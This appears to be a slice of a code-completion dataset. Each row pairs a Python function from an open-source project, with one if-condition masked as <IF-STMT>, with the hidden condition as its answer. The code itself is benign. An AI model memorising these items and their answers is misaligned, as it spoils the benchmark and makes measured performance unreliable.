466,"def __init__(self, *args, **kwargs):<tab>dict.__init__(self, *args, **kwargs)<tab>for key, value in self.items():<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(""key must be a str, not {}"".format(type(key)))<tab><tab>if not isinstance(value, NUMERIC_TYPES):<tab><tab><tab>raise TypeError(""value must be a NUMERIC_TYPES, not {}"".format(type(value)))<tab><tab>if not isinstance(value, float):<tab><tab><tab>self[key] = float(value)","if not isinstance ( key , string_types ) :",132
467,"def refresh_committed_offsets_if_needed(self):<tab>""""""Fetch committed offsets for assigned partitions.""""""<tab>if self._subscription.needs_fetch_committed_offsets:<tab><tab>offsets = self.fetch_committed_offsets(self._subscription.assigned_partitions())<tab><tab>for partition, offset in six.iteritems(offsets):<tab><tab><tab># verify assignment is still active<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._subscription.assignment[partition].committed = offset.offset<tab><tab>self._subscription.needs_fetch_committed_offsets = False",if self . _subscription . is_assigned ( partition ) :,143
468,"def getText(self, stuff):<tab>if isinstance(stuff, BaseWrapper):<tab><tab>stuff = stuff.item<tab>if isinstance(stuff, (Fit, TargetProfile)):<tab><tab>val, unit = self._getValue(stuff)<tab><tab><IF-STMT><tab><tab><tab>return """"<tab><tab># Stick to value - 25k GJ<tab><tab>if self.stickPrefixToValue:<tab><tab><tab>return ""{} {}"".format(formatAmount(val, *self.formatSpec), unit)<tab><tab># Stick to unit - 25 km<tab><tab>else:<tab><tab><tab>return formatAmount(val, *self.formatSpec, unitName=unit)<tab>return """"",if val is None :,155
469,"def __get__(self, inst, owner):<tab>try:<tab><tab>value, last_update = inst._cache[self.__name__]<tab><tab><IF-STMT><tab><tab><tab>raise AttributeError<tab>except (KeyError, AttributeError):<tab><tab>value = self.fget(inst)<tab><tab>try:<tab><tab><tab>cache = inst._cache<tab><tab>except AttributeError:<tab><tab><tab>cache = inst._cache = {}<tab><tab>cache[self.__name__] = (value, time.time())<tab>return value",if self . ttl > 0 and time . time ( ) - last_update > self . ttl :,134
470,"def on_event_clicked(self, widget, event):<tab>if event.type == Gdk.EventType.BUTTON_PRESS and event.button == 3:<tab><tab>path = self.get_path_at_pos(int(event.x), int(event.y))<tab><tab><IF-STMT><tab><tab><tab>row = self.get(path[0], ""device"")<tab><tab><tab>if row:<tab><tab><tab><tab>if self.Blueman is not None:<tab><tab><tab><tab><tab>if self.menu is None:<tab><tab><tab><tab><tab><tab>self.menu = ManagerDeviceMenu(self.Blueman)<tab><tab><tab><tab><tab>self.menu.popup(None, None, None, None, event.button, event.time)",if path is not None :,170
471,"def groups(self):<tab>""""""Return a dictionary mapping group names to JIDs.""""""<tab>result = {}<tab>for jid in self._jids:<tab><tab>groups = self._jids[jid][""groups""]<tab><tab><IF-STMT><tab><tab><tab>if """" not in result:<tab><tab><tab><tab>result[""""] = []<tab><tab><tab>result[""""].append(jid)<tab><tab>for group in groups:<tab><tab><tab>if group not in result:<tab><tab><tab><tab>result[group] = []<tab><tab><tab>result[group].append(jid)<tab>return result",if not groups :,133
472,"def set_meta(self, dataset, overwrite=True, **kwd):<tab>super().set_meta(dataset, overwrite=overwrite, **kwd)<tab>try:<tab><tab>conn = sqlite.connect(dataset.file_name)<tab><tab>c = conn.cursor()<tab><tab>version_query = ""SELECT version FROM meta""<tab><tab>results = c.execute(version_query).fetchall()<tab><tab>if len(results) == 0:<tab><tab><tab>raise Exception(""version not found in meta table"")<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Multiple versions found in meta table"")<tab><tab>dataset.metadata.gafa_schema_version = results[0][0]<tab>except Exception as e:<tab><tab>log.warning(""%s, set_meta Exception: %s"", self, e)",elif len ( results ) > 1 :,188
473,"def GetSelectedCount(self):<tab>if self.GetStyleL(""style"") & self.Style.LBS_MULTIPLESEL:<tab><tab>return self.SendMessage(self.Hwnd, self.Msg.LB_GETSELCOUNT, 0, 0)<tab>else:<tab><tab>result = self.SendMessage(self.Hwnd, self.Msg.LB_GETCURSEL, 0, 0)<tab><tab><IF-STMT><tab><tab><tab>return 0<tab><tab>return 1",if result == LB_ERR :,117
474,"def emit(self, record):<tab>try:<tab><tab>item = QListWidgetItem(self.format(record))<tab><tab><IF-STMT><tab><tab><tab>item.setIcon(QIcon.fromTheme(""dialog-warning""))<tab><tab><tab>item.setForeground(QBrush(Qt.red))<tab><tab>else:<tab><tab><tab>item.setIcon(QIcon.fromTheme(""dialog-information""))<tab><tab>self.app.exec_in_main(self._add_item, item)<tab>except (KeyboardInterrupt, SystemExit):<tab><tab>raise<tab>except:<tab><tab>self.handleError(record)",if record . levelno > logging . INFO :,142
475,"def _updater(data):<tab>assert data[""attrs""][""tvm_version""].startswith(from_ver)<tab>nodes = data[""nodes""]<tab>for idx, item in enumerate(nodes):<tab><tab>f = node_map.get(item[""type_key""], None)<tab><tab><IF-STMT><tab><tab><tab>for fpass in f:<tab><tab><tab><tab>item = fpass(item, nodes)<tab><tab>elif f:<tab><tab><tab>item = f(item, nodes)<tab><tab>nodes[idx] = item<tab>data[""attrs""][""tvm_version""] = to_ver<tab>return data","if isinstance ( f , list ) :",143
476,def remove_data(self):<tab>if self.path is not None:<tab><tab><IF-STMT><tab><tab><tab>os.remove(self.path)<tab><tab>if os.path.exists(self.get_json_path()):<tab><tab><tab>os.remove(self.get_json_path()),if os . path . exists ( self . path ) :,78
477,"def testsingle(self, sym):<tab>if self.settings == ""asterisk"":<tab><tab>return (sym == ""*"", ""*"")<tab>if self.settings == ""plus"":<tab><tab>return (sym == ""+"", ""+"")<tab>if self.settings == ""dash"":<tab><tab>return (sym == ""-"", ""-"")<tab>if self.settings == ""single"":<tab><tab><IF-STMT><tab><tab><tab>return (self.lastSym == sym, self.lastSym)<tab><tab>else:<tab><tab><tab>self.lastSym = sym<tab><tab><tab>return (True, None)<tab>return (None, None)",if self . lastSym :,138
478,"def update(self, other_dict, option_parser):<tab>if isinstance(other_dict, Values):<tab><tab>other_dict = other_dict.__dict__<tab>other_dict = other_dict.copy()<tab>for setting in option_parser.lists.keys():<tab><tab><IF-STMT><tab><tab><tab>value = getattr(self, setting)<tab><tab><tab>if value:<tab><tab><tab><tab>value += other_dict[setting]<tab><tab><tab><tab>del other_dict[setting]<tab>self._update_loose(other_dict)","if hasattr ( self , setting ) and setting in other_dict :",137
479,"def gprv_immv(ii):<tab>for i, op in enumerate(_gen_opnds(ii)):<tab><tab>if i == 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>elif i == 1:<tab><tab><tab>if op_immv(op):<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return False<tab>return True","if op . name == ""REG0"" and op_luf_start ( op , ""GPRv"" ) :",136
480,"def __call__(self, input_tensors, shape):<tab>if self.order in ""KA"":<tab><tab><IF-STMT><tab><tab><tab>order = TensorOrder.C_ORDER<tab><tab>else:<tab><tab><tab>order = TensorOrder.F_ORDER<tab>else:<tab><tab>if self.order == ""C"":<tab><tab><tab>order = TensorOrder.C_ORDER<tab><tab>else:<tab><tab><tab>order = TensorOrder.F_ORDER<tab>return self.new_tensor(input_tensors, shape=shape, dtype=self.dtype, order=order)",if any ( t . order == TensorOrder . C_ORDER for t in input_tensors ) :,141
481,"def check_selected(menu, path):<tab>selected = False<tab>if ""url"" in menu:<tab><tab>chop_index = menu[""url""].find(""?"")<tab><tab><IF-STMT><tab><tab><tab>selected = path.startswith(menu[""url""])<tab><tab>else:<tab><tab><tab>selected = path.startswith(menu[""url""][:chop_index])<tab>if ""menus"" in menu:<tab><tab>for m in menu[""menus""]:<tab><tab><tab>_s = check_selected(m, path)<tab><tab><tab>if _s:<tab><tab><tab><tab>selected = True<tab>if selected:<tab><tab>menu[""selected""] = True<tab>return selected",if chop_index == - 1 :,153
482,"def _check_events(self):<tab># make sure song-started and song-ended match up<tab>stack = []<tab>old = self.events[:]<tab>for type_, song in self.events:<tab><tab>if type_ == ""started"":<tab><tab><tab>stack.append(song)<tab><tab><IF-STMT><tab><tab><tab>self.assertTrue(stack.pop(-1) is song, msg=old)<tab>self.assertFalse(stack, msg=old)","elif type_ == ""ended"" :",110
483,"def __fixdict(self, dict):<tab>for key in dict.keys():<tab><tab>if key[:6] == ""start_"":<tab><tab><tab>tag = key[6:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab>if start is None:<tab><tab><tab><tab>self.elements[tag] = getattr(self, key), end<tab><tab><IF-STMT><tab><tab><tab>tag = key[4:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab>if end is None:<tab><tab><tab><tab>self.elements[tag] = start, getattr(self, key)","elif key [ : 4 ] == ""end_"" :",162
484,"def nested_match(expect, value):<tab>if expect == value:<tab><tab>return True<tab>if isinstance(expect, dict) and isinstance(value, dict):<tab><tab>for k, v in expect.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if not nested_match(v, value[k]):<tab><tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>return True<tab>if isinstance(expect, list) and isinstance(value, list):<tab><tab>for x, y in zip(expect, value):<tab><tab><tab>if not nested_match(x, y):<tab><tab><tab><tab>return False<tab><tab>return True<tab>return False",if k in value :,162
485,"def code_match(code, select, ignore):<tab>if ignore:<tab><tab>assert not isinstance(ignore, unicode)<tab><tab>for ignored_code in [c.strip() for c in ignore]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab>if select:<tab><tab>assert not isinstance(select, unicode)<tab><tab>for selected_code in [c.strip() for c in select]:<tab><tab><tab>if mutual_startswith(code.lower(), selected_code.lower()):<tab><tab><tab><tab>return True<tab><tab>return False<tab>return True","if mutual_startswith ( code . lower ( ) , ignored_code . lower ( ) ) :",143
486,"def test_cardinality_m2o(self):<tab>m2o_type_fields = [<tab><tab>f for f in self.fields_and_reverse_objects if f.is_relation and f.many_to_one<tab>]<tab># Test classes are what we expect<tab>self.assertEqual(MANY_TO_ONE_CLASSES, {f.__class__ for f in m2o_type_fields})<tab># Ensure all m2o reverses are o2m<tab>for obj in m2o_type_fields:<tab><tab><IF-STMT><tab><tab><tab>reverse_field = obj.field<tab><tab><tab>self.assertTrue(reverse_field.is_relation and reverse_field.one_to_many)","if hasattr ( obj , ""field"" ) :",172
487,"def flatten_dict(self, request):<tab>dct = super(KnowledgeFolderHandler, self).flatten_dict(request)<tab>dct[""knowledgeType_id""] = None<tab>parent = request.data.get(""parent"")<tab>if parent:<tab><tab>parent = getOrNone(KnowledgeFolder, pk=parent)<tab><tab><IF-STMT><tab><tab><tab>request.data[""parent""] = None<tab>return dct","if not parent or not request . user . profile . has_permission ( parent , mode = ""x"" ) :",116
488,"def delete_oidc_session_tokens(session):<tab>if session:<tab><tab>if ""oidc_access_token"" in session:<tab><tab><tab>del session[""oidc_access_token""]<tab><tab><IF-STMT><tab><tab><tab>del session[""oidc_id_token""]<tab><tab>if ""oidc_id_token_expiration"" in session:<tab><tab><tab>del session[""oidc_id_token_expiration""]<tab><tab>if ""oidc_login_next"" in session:<tab><tab><tab>del session[""oidc_login_next""]<tab><tab>if ""oidc_refresh_token"" in session:<tab><tab><tab>del session[""oidc_refresh_token""]<tab><tab>if ""oidc_state"" in session:<tab><tab><tab>del session[""oidc_state""]","if ""oidc_id_token"" in session :",179
489,"def prepare_text(text, style):<tab>body = []<tab>for fragment, sty in parse_tags(text, style, subs.styles):<tab><tab>fragment = fragment.replace(r""\h"", "" "")<tab><tab>fragment = fragment.replace(r""\n"", ""\n"")<tab><tab>fragment = fragment.replace(r""\N"", ""\n"")<tab><tab>if sty.italic:<tab><tab><tab>fragment = ""<i>%s</i>"" % fragment<tab><tab>if sty.underline:<tab><tab><tab>fragment = ""<u>%s</u>"" % fragment<tab><tab><IF-STMT><tab><tab><tab>fragment = ""<s>%s</s>"" % fragment<tab><tab>if sty.drawing:<tab><tab><tab>raise ContentNotUsable<tab><tab>body.append(fragment)<tab>return re.sub(""\n+"", ""\n"", """".join(body).strip())",if sty . strikeout :,198
490,"def test_reduce_different_name(<tab>ray_start_distributed_2_nodes_4_gpus, group_name, dst_rank):<tab>world_size = 4<tab>actors, _ = create_collective_workers(num_workers=world_size, group_name=group_name)<tab>results = ray.get([a.do_reduce.remote(group_name, dst_rank) for a in actors])<tab>for i in range(world_size):<tab><tab><IF-STMT><tab><tab><tab>assert (results[i] == cp.ones((10,), dtype=cp.float32) * world_size).all()<tab><tab>else:<tab><tab><tab>assert (results[i] == cp.ones((10,), dtype=cp.float32)).all()",if i == dst_rank :,182
491,"def _find_docstrings(self, filename):<tab># A replacement for trace.find_strings() which was deprecated in<tab># Python 3.2 and removed in 3.6.<tab>strs = set()<tab>prev = token.INDENT  # so module docstring is detected as docstring<tab>with tokenize_open(filename) as f:<tab><tab>tokens = tokenize.generate_tokens(f.readline)<tab><tab>for ttype, tstr, start, end, line in tokens:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>strs.update(range(start[0], end[0] + 1))<tab><tab><tab>prev = ttype<tab>return strs",if ttype == token . STRING and prev == token . INDENT :,158
492,"def on_click(self, event):<tab>button = event[""button""]<tab>if button in [self.button_next, self.button_previous]:<tab><tab><IF-STMT><tab><tab><tab>self.scrolling = True<tab><tab><tab>if button == self.button_next:<tab><tab><tab><tab>self.active_index += 1<tab><tab><tab>elif button == self.button_previous:<tab><tab><tab><tab>self.active_index -= 1<tab><tab><tab>self.active_index %= self.count_stations<tab><tab>else:<tab><tab><tab>self.py3.prevent_refresh()<tab>elif button == self.button_refresh:<tab><tab>self.idle_time = 0<tab>else:<tab><tab>self.py3.prevent_refresh()",if self . station_data :,178
493,"def findRule(instance, ruleSet):<tab>""""""find the rule(s) that matches the feture vector passed""""""<tab># print(""*Looking for rule match for Feature vector: "" + featuresToString(instance))<tab>ruleNumber = 0  # counter to track rule number<tab>ruleMatches = []  # will hold all rule numbers that matched<tab>for rule in ruleSet:<tab><tab>if ruleMatch(rule, instance):<tab><tab><tab>ruleMatches.append(ruleNumber)<tab><tab><tab>counts[<tab><tab><tab><tab>ruleNumber<tab><tab><tab>] += 1  # update global histogram of rule matches for stats reporting<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print("" ruleMatch found at rule #"" + str(ruleNumber))<tab><tab><tab><tab>print("" "", end="""")<tab><tab><tab><tab>printRule(rule)<tab><tab>ruleNumber += 1<tab>return ruleMatches",if False :,200
494,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>length = d.getVarInt32()<tab><tab><tab>tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length)<tab><tab><tab>d.skip(length)<tab><tab><tab>self.mutable_peer_ip().TryMerge(tmp)<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 18 :,139
495,"def _check_no_tensors(parameters: Params):<tab>flat_params = tf.nest.flatten(parameters.params)<tab>for p in flat_params:<tab><tab><IF-STMT><tab><tab><tab>_check_no_tensors(p)<tab><tab>if tf.is_tensor(p):<tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""Saw a `Tensor` value in parameters:\n  {}"".format(parameters)<tab><tab><tab>)","if isinstance ( p , Params ) :",108
496,"def all_zinc_rsc_invalid_dep_keys(invalid_deps):<tab>""""""Get the rsc key for an rsc-and-zinc target, or the zinc key for a zinc-only target.""""""<tab>for tgt in invalid_deps:<tab><tab># None can occur for e.g. JarLibrary deps, which we don't need to compile as they are<tab><tab># populated in the resolve goal.<tab><tab>tgt_rsc_cc = compile_contexts[tgt].rsc_cc<tab><tab><IF-STMT><tab><tab><tab># Rely on the results of zinc compiles for zinc-compatible targets<tab><tab><tab>yield self._key_for_target_as_dep(tgt, tgt_rsc_cc.workflow)",if tgt_rsc_cc . workflow is not None :,182
497,"def characters(self, ch):<tab>if self.Text_tag:<tab><tab>if self.Summary_tag:<tab><tab><tab>self.Summary_ch += ch<tab><tab>elif self.Attack_Prerequisite_tag:<tab><tab><tab>self.Attack_Prerequisite_ch += ch<tab><tab><IF-STMT><tab><tab><tab>self.Solution_or_Mitigation_ch += ch<tab>elif self.CWE_ID_tag:<tab><tab>self.CWE_ID_ch += ch",elif self . Solution_or_Mitigation_tag :,127
498,"def load_tool_from_cache(self, config_file, recover_tool=False):<tab>tool_cache = getattr(self.app, ""tool_cache"", None)<tab>tool = None<tab>if tool_cache:<tab><tab><IF-STMT><tab><tab><tab>tool = tool_cache.get_removed_tool(config_file)<tab><tab>else:<tab><tab><tab>tool = tool_cache.get_tool(config_file)<tab>return tool",if recover_tool :,108
499,"def _generate_examples(self, archive, directory, labeled=True):<tab>""""""Generate IMDB examples.""""""<tab># For labeled examples, extract the label from the path.<tab>reg_path = ""(?P<label>neg|pos)"" if labeled else ""unsup""<tab>reg = re.compile(<tab><tab>os.path.join(""^%s"" % directory, reg_path, """").replace(""\\"", ""\\\\"")<tab>)<tab>for path, imdb_f in archive:<tab><tab>res = reg.match(path)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>text = imdb_f.read().strip()<tab><tab>label = res.groupdict()[""label""] if labeled else -1<tab><tab>yield path, {<tab><tab><tab>""text"": text,<tab><tab><tab>""label"": label,<tab><tab>}",if not res :,188
500,def startInputThread(self):<tab># cv.acquire()<tab># Fix Python 2.x.<tab>global input<tab>try:<tab><tab>input = raw_input<tab>except NameError:<tab><tab>pass<tab>while True:<tab><tab>cmd = (<tab><tab><tab>self._queuedCmds.pop(0)<tab><tab><tab>if len(self._queuedCmds)<tab><tab><tab>else input(self.getPrompt()).strip()<tab><tab>)<tab><tab>wait = self.execCmd(cmd)<tab><tab><IF-STMT><tab><tab><tab>self.acceptingInput = False<tab><tab><tab>self.blockingQueue.get(True)<tab><tab><tab># cv.wait()<tab><tab><tab># self.inputThread.wait()<tab><tab>self.acceptingInput = True,if wait :,181
501,"def assertS_IS(self, name, mode):<tab># test format, lstrip is for S_IFIFO<tab>fmt = getattr(stat, ""S_IF"" + name.lstrip(""F""))<tab>self.assertEqual(stat.S_IFMT(mode), fmt)<tab># test that just one function returns true<tab>testname = ""S_IS"" + name<tab>for funcname in self.format_funcs:<tab><tab>func = getattr(stat, funcname, None)<tab><tab>if func is None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(funcname)<tab><tab><tab>continue<tab><tab>if funcname == testname:<tab><tab><tab>self.assertTrue(func(mode))<tab><tab>else:<tab><tab><tab>self.assertFalse(func(mode))",if funcname == testname :,180
502,"def test_compatibility(self) -> None:<tab>for expected, user_agent in self.data:<tab><tab>result = self.client_get(""/compatibility"", HTTP_USER_AGENT=user_agent)<tab><tab>if expected == ""ok"":<tab><tab><tab>self.assert_json_success(result)<tab><tab><IF-STMT><tab><tab><tab>self.assert_json_error(result, ""Client is too old"")<tab><tab>else:<tab><tab><tab>assert False  # nocoverage","elif expected == ""old"" :",114
503,"def getBranchFromFile():<tab>global _gitdir<tab>branch = None<tab>if _gitdir:<tab><tab>headFile = os.path.join(_gitdir, ""HEAD"")<tab><tab><IF-STMT><tab><tab><tab>with open(headFile, ""r"", encoding=""utf-8"") as f:<tab><tab><tab><tab>line = f.readline()<tab><tab><tab><tab>if line:<tab><tab><tab><tab><tab>if line.startswith(""ref""):<tab><tab><tab><tab><tab><tab>branch = line.split(""/"")[-1].strip()<tab><tab><tab><tab><tab>else:<tab><tab><tab><tab><tab><tab>branch = ""HEAD""<tab>return branch",if os . path . isfile ( headFile ) :,151
504,"def get_job_parameters_dict(self, job_parameters: RunParameters = None):<tab>if job_parameters:<tab><tab><IF-STMT><tab><tab><tab>self.job_runtime_conf[""job_parameters""][""common""] = job_parameters.to_dict()<tab><tab>else:<tab><tab><tab>self.job_runtime_conf[""job_parameters""] = job_parameters.to_dict()<tab>return self.job_runtime_conf[""job_parameters""]","if int ( self . job_runtime_conf . get ( ""dsl_version"" , 1 ) ) == 2 :",126
505,"def ConnectHandler(*args, **kwargs):<tab>""""""Factory function selects the proper class and creates object based on device_type.""""""<tab>device_type = kwargs[""device_type""]<tab>if device_type not in platforms:<tab><tab><IF-STMT><tab><tab><tab>msg_str = platforms_str<tab><tab>else:<tab><tab><tab>msg_str = telnet_platforms_str if ""telnet"" in device_type else platforms_str<tab><tab>raise ValueError(<tab><tab><tab>""Unsupported 'device_type' ""<tab><tab><tab>""currently supported platforms are: {}"".format(msg_str)<tab><tab>)<tab>ConnectionClass = ssh_dispatcher(device_type)<tab>return ConnectionClass(*args, **kwargs)",if device_type is None :,167
506,"def get_next_parent_entities(item, pids):<tab>ret = list()<tab>for [parent, entity_id] in parents[item]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if parent in entities:<tab><tab><tab>ret.append(parent)<tab><tab>else:<tab><tab><tab>pids.append(entity_id)<tab><tab><tab>for p in get_next_parent_entities(parent, pids):<tab><tab><tab><tab>ret.append(p)<tab>return ret",if entity_id in pids :,119
507,"def load(self, data):<tab>ckey = None<tab>for key, val in _rx_cookie.findall(data):<tab><tab><IF-STMT><tab><tab><tab>if ckey:<tab><tab><tab><tab>self[ckey][key] = _unquote(val)<tab><tab>elif key[0] == ""$"":<tab><tab><tab># RFC2109: NAMEs that begin with $ are reserved for other uses<tab><tab><tab># and must not be used by applications.<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>self[key] = _unquote(val)<tab><tab><tab>ckey = key",if key . lower ( ) in _c_keys :,143
508,def getIdentifier(self):<tab>start = self.index<tab>self.index += 1<tab>while self.index < self.length:<tab><tab>ch = self.ccode()<tab><tab><IF-STMT><tab><tab><tab># Blackslash (U+005C) marks Unicode escape sequence.<tab><tab><tab>self.index = start<tab><tab><tab>return self.getEscapedIdentifier()<tab><tab>if isIdentifierPart(ch):<tab><tab><tab>self.index += 1<tab><tab>else:<tab><tab><tab>break<tab>return self.source[start : self.index],if ch == 0x5C :,134
509,"def test_floats_unequal_float(self):<tab>try:<tab><tab>self.assertEqual(<tab><tab><tab>np.array([[1, 2], [3, 4.5]], dtype=np.float32),<tab><tab><tab>np.array([[1, 2], [3, 5]], dtype=np.float32),<tab><tab>)<tab>except AssertionError as e:<tab><tab><IF-STMT><tab><tab><tab>raise self.failureException(""Float array mismatch error not raised."")","if not str ( e ) . startswith ( ""Arrays not almost equal to 6 decimals"" ) :",119
510,"def _set_counts(self):<tab>self[""regions_count""] = len(self[""regions""])<tab>for _, key in self._children:<tab><tab># VPCs should not be counted as resources. They exist whether you have resources or not,<tab><tab># so counting them would make the report confusing.<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self[key + ""_count""] = sum(<tab><tab><tab>[region[key + ""_count""] for region in self[""regions""].values()]<tab><tab>)","if key == ""vpcs"" :",123
511,"def total_form_count(self):<tab>""""""Returns the total number of forms in this FormSet.""""""<tab>if self.data or self.files:<tab><tab>return self.management_form.cleaned_data[TOTAL_FORM_COUNT]<tab>else:<tab><tab>initial_forms = self.initial_form_count()<tab><tab>total_forms = initial_forms + self.extra<tab><tab># Allow all existing related objects/inlines to be displayed,<tab><tab># but don't allow extra beyond max_num.<tab><tab>if initial_forms > self.max_num >= 0:<tab><tab><tab>total_forms = initial_forms<tab><tab><IF-STMT><tab><tab><tab>total_forms = self.max_num<tab>return total_forms",elif total_forms > self . max_num >= 0 :,180
512,"def mouse_down(self, evt):<tab>if self.parent.level:<tab><tab>toolNo = self.toolNumberUnderMouse(evt.pos)<tab><tab>if toolNo < 0 or toolNo > 8:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>self.selectTool(toolNo)<tab><tab>if evt.button == 3:<tab><tab><tab>self.showToolOptions(toolNo)",if evt . button == 1 :,100
513,"def find_comment(line):<tab>""""""Finds the index of a comment # and returns None if not found""""""<tab>instring, instring_char = False, """"<tab>for i, char in enumerate(line):<tab><tab>if char in ('""', ""'""):<tab><tab><tab>if instring:<tab><tab><tab><tab>if char == instring_char:<tab><tab><tab><tab><tab>instring = False<tab><tab><tab><tab><tab>instring_char = """"<tab><tab><tab>else:<tab><tab><tab><tab>instring = True<tab><tab><tab><tab>instring_char = char<tab><tab>elif char == ""#"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return i<tab>return None",if not instring :,155
514,"def __getattr__(self, key):<tab>if key == key.upper():<tab><tab>if hasattr(self._django_settings, key):<tab><tab><tab>return getattr(self._django_settings, key)<tab><tab><IF-STMT><tab><tab><tab>return getattr(self._default_settings, key)<tab>raise AttributeError(<tab><tab>""%r object has no attribute %r"" % (self.__class__.__name__, key)<tab>)","elif hasattr ( self . _default_settings , key ) :",106
515,"def replace_entities(match, entities=entities, encoding=encoding):<tab>ent = match.group()<tab>if ent[1] == ""#"":<tab><tab>return unescape_charref(ent[2:-1], encoding)<tab>repl = entities.get(ent)<tab>if repl is not None:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>repl = repl.decode(encoding)<tab><tab><tab>except UnicodeError:<tab><tab><tab><tab>repl = ent<tab>else:<tab><tab>repl = ent<tab>return repl","if hasattr ( repl , ""decode"" ) and encoding is not None :",132
516,"def test_floor_div(self):<tab>""""""Util.number.floor_div""""""<tab>self.assertRaises(TypeError, number.floor_div, ""1"", 1)<tab>for a in range(-10, 10):<tab><tab>for b in range(-10, 10):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.assertRaises(ZeroDivisionError, number.floor_div, a, b)<tab><tab><tab>else:<tab><tab><tab><tab>self.assertEqual(<tab><tab><tab><tab><tab>(a, b, int(math.floor(float(a) / b))),<tab><tab><tab><tab><tab>(a, b, number.floor_div(a, b)),<tab><tab><tab><tab>)",if b == 0 :,159
517,"def get(self, method, **kws):<tab>resp = None<tab>if method in self.responses:<tab><tab>resp = self.responses[method].pop(0)<tab><tab><IF-STMT><tab><tab><tab>checks = resp[""validate""][""checks""]<tab><tab><tab>resp = resp[""validate""][""data""]<tab><tab><tab>for check in checks:<tab><tab><tab><tab>assert check in kws<tab><tab><tab><tab>expected_value = checks[check]<tab><tab><tab><tab>assert expected_value == kws[check]<tab>return resp","if ""validate"" in resp :",123
518,def __add_changelisteners(self):<tab>NewPlayerSettlementHovered.subscribe(self.on_settlement_change)<tab>if self.__current_settlement is not None:<tab><tab>inventory = self.__current_settlement.get_component(StorageComponent).inventory<tab><tab><IF-STMT><tab><tab><tab>inventory.add_change_listener(self.refresh),if not inventory . has_change_listener ( self . refresh ) :,94
519,"def __call__(self, target):<tab>if ""weights"" not in target.temp:<tab><tab>return True<tab>targets = target.temp[""weights""]<tab>for cname in target.children:<tab><tab><IF-STMT><tab><tab><tab>c = target.children[cname]<tab><tab><tab>deviation = abs((c.weight - targets[cname]) / targets[cname])<tab><tab><tab>if deviation > self.tolerance:<tab><tab><tab><tab>return True<tab>if ""cash"" in target.temp:<tab><tab>cash_deviation = abs(<tab><tab><tab>(target.capital - targets.value) / targets.value - target.temp[""cash""]<tab><tab>)<tab><tab>if cash_deviation > self.tolerance:<tab><tab><tab>return True<tab>return False",if cname in targets :,178
520,"def copyfileobj(src, dest, length=512):<tab>if hasattr(src, ""readinto""):<tab><tab>buf = bytearray(length)<tab><tab>while True:<tab><tab><tab>sz = src.readinto(buf)<tab><tab><tab>if not sz:<tab><tab><tab><tab>break<tab><tab><tab><IF-STMT><tab><tab><tab><tab>dest.write(buf)<tab><tab><tab>else:<tab><tab><tab><tab>b = memoryview(buf)[:sz]<tab><tab><tab><tab>dest.write(b)<tab>else:<tab><tab>while True:<tab><tab><tab>buf = src.read(length)<tab><tab><tab>if not buf:<tab><tab><tab><tab>break<tab><tab><tab>dest.write(buf)",if sz == length :,162
521,"def test_api_history_restrict_cat(self):<tab>slot_sum = 0<tab># Loop over all categories in the fake history, plus the Default category<tab>cats = list(self.history_category_options)<tab>cats.extend(""*"")<tab>for cat in cats:<tab><tab>json = self._get_api_history({""category"": cat})<tab><tab>slot_sum += len(json[""history""][""slots""])<tab><tab># All results should be from the correct category<tab><tab>for slot in json[""history""][""slots""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>assert slot[""category""] == cat<tab># Total number of slots should match the sum of all category slots<tab>json = self._get_api_history({""limit"": self.history_size})<tab>slot_total = len(json[""history""][""slots""])<tab>assert slot_sum == slot_total","if cat != ""*"" :",199
522,"def checker(self):<tab>while True:<tab><tab>try:<tab><tab><tab>ip = self.get_ip()<tab><tab>except Exception as e:<tab><tab><tab>xlog.info(""no ip left"")<tab><tab><tab>return<tab><tab>try:<tab><tab><tab>res = self.check_ip.check_ip(ip, sni=host, host=host)<tab><tab>except Exception as e:<tab><tab><tab>xlog.warn(""check fail:%s except:%r"", e)<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>xlog.debug(""check fail:%s fail"", ip)<tab><tab><tab>continue<tab><tab>self.write_ip(ip, res.domain, res.handshake_time)",if not res or not res . ok :,173
523,"def create_row_processor(<tab>self, context, path, loadopt, mapper, result, adapter, populators):<tab># look through list of columns represented here<tab># to see which, if any, is present in the row.<tab>for col in self.columns:<tab><tab>if adapter:<tab><tab><tab>col = adapter.columns[col]<tab><tab>getter = result._getter(col, False)<tab><tab><IF-STMT><tab><tab><tab>populators[""quick""].append((self.key, getter))<tab><tab><tab>break<tab>else:<tab><tab>populators[""expire""].append((self.key, True))",if getter :,145
